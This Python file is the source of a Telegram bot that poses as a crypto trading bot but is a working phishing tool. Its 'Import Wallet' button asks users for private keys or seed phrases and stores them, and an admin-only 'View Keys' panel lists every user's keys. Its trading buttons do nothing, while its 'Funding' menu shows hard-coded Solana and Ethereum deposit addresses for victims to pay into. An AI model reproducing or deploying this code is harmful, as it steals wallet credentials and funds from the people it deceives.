import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import logging
from flask import Flask
from threading import Thread

# ====================== CONFIG ======================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(os.getenv("ADMIN_ID"))]

SOL_ADDRESS = "BHhieJZEfPfkKuecvATY8fRGspJF1CBFEVeQoxRwqj8f"
ETH_ADDRESS = "0x1a45bc99b0AA4f8a4daB9463310C97678cE37AE4"

users = {}
waiting_for_import = set()

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

# ====================== FAKE WEB SERVER (for Render) ======================
app_web = Flask('')

@app_web.route('/')
def home():
    return "Bot is alive!"

def run():
    app_web.run(host='0.0.0.0', port=10000)

def keep_alive():
    t = Thread(target=run)
    t.start()

# ====================== KEYBOARDS ======================
def main_menu():
    keyboard = [
        [InlineKeyboardButton("🛒 Buy", callback_data="buy"),
         InlineKeyboardButton("💰 Sell", callback_data="sell")],
        [InlineKeyboardButton("💳 Funding", callback_data="funding"),
         InlineKeyboardButton("📊 Position", callback_data="position")],
        [InlineKeyboardButton("🏧 Withdrawal", callback_data="withdrawal"),
         InlineKeyboardButton("🔑 Import Wallet", callback_data="import")],
    ]
    return InlineKeyboardMarkup(keyboard)

def back_menu():
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main")]]
    return InlineKeyboardMarkup(keyboard)

def admin_menu():
    keyboard = [
        [InlineKeyboardButton("👥 View Users", callback_data="admin_users")],
        [InlineKeyboardButton("🔑 View Keys", callback_data="admin_keys")],
        [InlineKeyboardButton("💰 Total Deposited", callback_data="admin_total")],
        [InlineKeyboardButton("🔙 Close", callback_data="admin_close")],
    ]
    return InlineKeyboardMarkup(keyboard)

# ====================== HANDLERS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    users[user.id] = users.get(user.id, {"keys": None})
    text = f"👋 Welcome {user.first_name}!\n\nWhat would you like to do?"
    if update.message:
        await update.message.reply_text(text, reply_markup=main_menu())
    else:
        await update.callback_query.edit_message_text(text, reply_markup=main_menu())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "main":
        await start(update, context)
        return

    if data == "buy":
        await query.edit_message_text("Fund your wallet then\nEnter a token symbol or address to buy", reply_markup=back_menu())
    elif data == "sell":
        await query.edit_message_text("You do not have any tokens yet! Start trading in the Buy menu.", reply_markup=back_menu())
    elif data == "funding":
        text = f"🟢 Solana\n`{SOL_ADDRESS}`\n\n🟢 Ethereum\n`{ETH_ADDRESS}`"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_menu())
    elif data == "position":
        await query.edit_message_text("You do not have any tokens yet! Start trading in the Buy menu.", reply_markup=back_menu())
    elif data == "withdrawal":
        await query.edit_message_text("🟢 Sol 0.00$\n🟢 Eth 0.00$", reply_markup=back_menu())
    elif data == "import":
        waiting_for_import.add(user_id)
        await query.edit_message_text("Provide the private keys or seed phrase you'd like to import.", reply_markup=back_menu())

    # Admin
    elif data == "admin_users":
        text = f"👥 Total users: {len(users)}\n\n" + "\n".join([f"• `{uid}`" for uid in users]) if users else "No users yet."
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_menu())
    elif data == "admin_keys":
        if not users:
            text = "No users yet."
        else:
            text = "🔑 User Keys:\n\n"
            for uid, data in users.items():
                text += f"User `{uid}`:\n`{data.get('keys', 'None')}`\n\n"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_menu())
    elif data == "admin_total":
        await query.edit_message_text("💰 Total deposited: $0.00", reply_markup=admin_menu())
    elif data == "admin_close":
        await query.edit_message_text("Admin panel closed.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    if user_id in waiting_for_import:
        users[user_id] = users.get(user_id, {})
        users[user_id]["keys"] = text
        waiting_for_import.discard(user_id)
        await update.message.reply_text("✅ Wallet imported successfully.", reply_markup=main_menu())

async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ You are not authorized.")
        return
    await update.message.reply_text("🔐 Admin Panel", reply_markup=admin_menu())

# ====================== MAIN ======================
def main():
    keep_alive()  # ← This keeps Render happy
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()